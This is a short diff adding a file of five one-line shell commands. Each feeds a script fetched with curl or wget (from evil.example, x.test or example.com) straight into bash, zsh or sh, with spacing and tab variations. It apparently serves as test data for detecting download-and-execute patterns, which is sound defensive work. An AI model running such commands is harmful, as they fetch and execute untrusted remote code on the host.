@@ -1,0 +1,5 @@
+bash <(curl -s https://evil.example/x.sh)
+sh -c ignored; zsh <( wget -qO- http://x.test/y)
+bash <(  curl https://example.com/x)
+bash <(\tcurl https://example.com/x)
+sh <(\t wget -qO- https://example.com/x)
